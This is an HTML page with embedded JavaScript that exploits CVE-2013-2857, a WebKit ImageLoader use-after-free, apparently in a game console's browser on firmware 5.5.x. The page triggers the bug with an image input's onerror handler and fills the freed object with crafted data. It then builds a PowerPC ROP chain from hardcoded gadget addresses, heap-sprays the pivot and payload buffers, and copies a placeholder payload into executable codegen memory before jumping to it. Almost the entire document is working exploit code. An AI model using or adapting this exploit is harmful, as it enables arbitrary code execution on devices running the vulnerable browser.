<!--
Tested on 5.5.1
CVE-2013-2857
Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
Result: Bug is present, crash
-->
<script>
var ar;
var ar2;
function UaF(a)
{    
    //Warning, the delta was modified !
    var delta                   = 0x00000000; //from 0x0 to 0x04000000 step by 0x01000000
    var pivotAdress             = 0x010ADDCC;
    //5.5.2
    {
        var pivotAdressAdress       = 0x1B800000; //r6
        var payloadAdress           = 0x1D600000 + delta;
    }
    var codegenAddress          = 0x01800000;
    var sizeWebCoreImageLoader  = 0x18;
    var sprayCount              = 1000;
    var _4K                     = 0x1000;
    var _16K                    = 0x4000;
    var _32K                    = 0x8000;
    var _64K                    = 0x10000;
    
    //radio is the *ONLY* type that left the freed WebCore::ImageLoader free !
    a.type="radio";
    
    //Allocate this new WebCore::ImageLoader over freed WebCore::
    var ab = new ArrayBuffer(sizeWebCoreImageLoader);
    var dv = new DataView(ab)
    /*
    0:000:x86> dt webkit!WebCore::ImageLoader
       +0x000 __VFN_table : Ptr32 
       +0x004 m_client         : Ptr32 WebCore::ImageLoaderClient
       +0x008 m_image          : WebCore::CachedResourceHandle<WebCore::CachedImage>
       +0x00c m_failedLoadURL  : WTF::AtomicString
       +0x010 m_hasPendingBeforeLoadEvent : Pos 0, 1 Bit
       +0x010 m_hasPendingLoadEvent : Pos 1, 1 Bit
       +0x010 m_hasPendingErrorEvent : Pos 2, 1 Bit
       +0x010 m_imageComplete  : Pos 3, 1 Bit
       +0x010 m_loadManually   : Pos 4, 1 Bit
       +0x010 m_elementIsProtected : Pos 5, 1 Bit
    */
    //Register:r3 Adress:0x1AF35330-0x1AF35360
    dv.setUint32(0x00, 0x00000000);         //vtable
    dv.setUint32(0x04, pivotAdressAdress);  //m_client
    dv.setUint32(0x08, pivotAdressAdress);  //m_image
    dv.setUint32(0x0C, 0x00000000);         //m_failedLoadURL
    dv.setUint32(0x10, 0x00000000);         //m_hasPendingBeforeLoadEvent
    dv.setUint32(0x14, 0x00000000);         //padding
    
    //Rop offset
    {
        ROP_POPJUMPLR_STACK12 = 0x0101cd24;
        ROP_POPJUMPLR_STACK20 = 0x01024d88;
        ROP_CALLFUNC = 0x01080274;
        ROP_CALLR28_POP_R28_TO_R31 = 0x0107dd70;
        ROP_POP_R28R29R30R31 = 0x0101d8d4;
        ROP_POP_R27 = 0x0101cb00;
        ROP_POP_R24_TO_R31 = 0x010204c8;
        ROP_CALLFUNCPTR_WITHARGS_FROM_R3MEM = 0x010253c0;
        ROP_SETR3TOR31_POP_R31 = 0x0101cc10;

        ROP_memcpy = 0x01035fc8;
        ROP_DCFlushRange = 0x01023f88;
        ROP_ICInvalidateRange = 0x010240b0;
        ROP_OSSwitchSecCodeGenMode = 0x010376c0;
        ROP_OSCodegenCopy = 0x010376d8;
        ROP_OSGetCodegenVirtAddrRange = 0x010375c0;
        ROP_OSGetCoreId = 0x01024e8c;
        ROP_OSGetCurrentThread = 0x01043150;
        ROP_OSSetThreadAffinity = 0x010429dc;
        ROP_OSYieldThread = 0x010418e4;
        ROP_OSFatal = 0x01031618;
        ROP_Exit = 0x0101cd80;
        ROP_OSScreenFlipBuffersEx = 0x0103afd0;
        ROP_OSScreenClearBufferEx = 0x0103b090;
        ROP_OSDynLoad_Acquire = 0x0102a3b4;
        ROP_OSDynLoad_FindExport = 0x0102b828;
        ROP_os_snprintf = 0x0102f160;
    }
    
    //Rop helper
    {
        var ropCurrentDv = null;
        var ropCurrentOffset = 0;
        
        function ropchain_appendu32(val)
        {
            ropCurrentDv.setUint32(ropCurrentOffset, val);
            ropCurrentOffset += 4;
        }
        
        function ropgen_pop_r24_to_r31(r24, r25, r26, r27, r28, r29, r30, r31)
        {
            ropchain_appendu32(ROP_POP_R24_TO_R31);
            ropchain_appendu32(0x0);
            ropchain_appendu32(0x0);
            
            ropchain_appendu32(r24);
            ropchain_appendu32(r25);
            ropchain_appendu32(r26);
            ropchain_appendu32(r27);
            ropchain_appendu32(r28);
            ropchain_appendu32(r29);
            ropchain_appendu32(r30);
            ropchain_appendu32(r31);
            
            ropchain_appendu32(0x0);
        }
        
        function ropgen_callfunc(funcaddr, r3, r4, r5, r6, r28)
        {
            ropgen_pop_r24_to_r31(r6, r5, 0, ROP_CALLR28_POP_R28_TO_R31, funcaddr, r3, 0, r4);

            ropchain_appendu32(ROP_CALLFUNC);

            ropchain_appendu32(r28);//r28
            ropchain_appendu32(0x0);//r29
            ropchain_appendu32(0x0);//r30
            ropchain_appendu32(0x0);//r31
            ropchain_appendu32(0x0);
        }
        
        function ropgen_switchto_core1()
        {
            ropgen_callfunc(ROP_OSGetCurrentThread, 0x0, 0x2, 0x0, 0x0, ROP_OSSetThreadAffinity);//Set r3 to current OSThread* and setup r31 + the r28 value used by the below.

            ropchain_appendu32(ROP_CALLR28_POP_R28_TO_R31);//ROP_OSSetThreadAffinity(<output from the above call>, 0x2);

            ropchain_appendu32(ROP_OSYieldThread);//r28
            ropchain_appendu32(0x0);//r29
            ropchain_appendu32(0x0);//r30
            ropchain_appendu32(0x0);//r31
            ropchain_appendu32(0x0);

            ropchain_appendu32(ROP_CALLR28_POP_R28_TO_R31);

            ropchain_appendu32(0x0);//r28
            ropchain_appendu32(0x0);//r29
            ropchain_appendu32(0x0);//r30
            ropchain_appendu32(0x0);//r31
            ropchain_appendu32(0x0);
        }
        
        function ropgen_OSSwitchSecCodeGenMode(flag)//flag0 == RW- permissions, flag1 == R-X permissions.
        {
            ropgen_callfunc(ROP_OSSwitchSecCodeGenMode, flag, 0x0, 0x0, 0x0, 0x0);
        }
        
        function ropgen_memcpy(dst, src, size)
        {
            ropgen_callfunc(ROP_memcpy, dst, src, size, 0x0, 0x0);
        }
        
        function ropgen_DCFlushRange(addr, size)
        {
            ropgen_callfunc(ROP_DCFlushRange, addr, size, 0x0, 0x0, 0x0);
        }

        function ropgen_ICInvalidateRange(addr, size)
        {
            ropgen_callfunc(ROP_ICInvalidateRange, addr, size, 0x0, 0x0, 0x0);
        }
        
        function ropgen_copycodebin_to_codegen(codegen_addr, codebin_addr, codebin_size)
        {
            ropgen_OSSwitchSecCodeGenMode(0);
            ropgen_memcpy(codegen_addr, codebin_addr, codebin_size);
            ropgen_OSSwitchSecCodeGenMode(1);

            ropgen_DCFlushRange(codegen_addr, codebin_size);
            ropgen_ICInvalidateRange(codegen_addr, codebin_size);
        }
    }
    
    //Prepare pivot & RopChain
    {
        var pivotRopAb = new ArrayBuffer(_4K);
        var pivotRopDv = new DataView(pivotRopAb);
        for(var j=0; j<_4K; j+=4){
            pivotRopDv.setUint32(j, 0x10000000+j); //filler
        }

        pivotRopDv.setUint32(0x204, 0x0);
        pivotRopDv.setUint32(0x018, pivotAdressAdress);
        pivotRopDv.setUint32(0x000, pivotAdressAdress+0x20);
        pivotRopDv.setUint32(0x2BC, pivotAdress); //lwz r0, 0x4(r11) ; mtlr r0 ; mr r1, r11 ; li r3, -0x1 ; blr ;
        //r11, new stack location
        pivotRopDv.setUint32(0x208, pivotAdressAdress+0x300);

        //initialize this Rop Chain
        ropCurrentDv = pivotRopDv;
        ropCurrentOffset = 0x304;

        //start of the Rop Chain
        
        //switch to core1
        ropgen_switchto_core1();
        
        //copy to payload to codegen
        ropgen_copycodebin_to_codegen(codegenAddress, payloadAdress, _64K)
        
        //prepare payload argument
        payload_srcaddr = payloadAdress;
        ROPHEAP = payload_srcaddr + 0x800000;
        ropgen_pop_r24_to_r31(ROP_OSFatal, ROP_Exit, ROP_OSDynLoad_Acquire, ROP_OSDynLoad_FindExport, ROP_os_snprintf, payload_srcaddr, 8, ROPHEAP);//Setup r24..r31 at the time of payload entry. Basically a "paramblk" in the form of registers, since this is the only available way to do this with the ROP-gadgets currently used by this codebase.
    
        //Jump on the payload
    	ropchain_appendu32(codegenAddress);//Jump to the codegen area where the payload was written. 
	
        //Setup the code-loading ROP-chain which can be used by the loader-payload, since the above one isn't usable after execution due to being corrupted.
        ropchain_appendu32(0x0);
        ropgen_copycodebin_to_codegen(codegenAddress, payloadAdress, _64K)
        ropgen_pop_r24_to_r31(ROP_OSFatal, ROP_Exit, ROP_OSDynLoad_Acquire, ROP_OSDynLoad_FindExport, ROP_os_snprintf, payload_srcaddr, 8, ROPHEAP);
    	ropchain_appendu32(codegenAddress);//Jump to the codegen area where the payload was written. 
    }
    
    //Spray large ArrayBuffer with pivotAdress    
    //Middle range 0x1B800000
    ar = new Array(0x1800);
    for(var i=0; i<0x1800; i++){  
        ar[i] = pivotRopAb.slice(0);
    }
    
    //Spray final payload
    //Middle range 0x1DC00000
    ar2 = new Array(sprayCount);
    var payloadArray = new Uint8Array(
                                        [
											$$REPLACEME$$
                                        ]
                                      );
    for(var i=0; i<sprayCount; i++){
        ar2[i] = new Uint8Array(payloadArray);
    }
    
    //alert("wait...");
    
    //Use the new WebCore::ImageLoader & pivot !
    return 0;
}
</script>

<input id="x" type="image" onerror="UaF(this);" src=""/>
